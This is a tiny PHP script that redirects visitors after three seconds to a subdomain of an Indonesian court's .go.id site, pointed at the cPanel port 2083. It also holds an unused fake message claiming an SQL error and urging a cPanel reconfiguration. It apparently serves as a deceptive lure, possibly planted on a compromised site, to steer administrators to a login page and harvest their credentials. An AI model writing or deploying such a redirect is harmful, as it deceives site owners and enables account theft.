<?php
$delay = 3; // Waktu penundaan dalam detik
$redirect_url = "http://dihan.pn-tanjungkarang.go.id/?:2083"; // URL halaman tujuan
$pesan = "You have an error in your SQL syntax in database ,Please reconfig to your cpanel";

header("Refresh: $delay; URL=$redirect_url");
exit();
?>
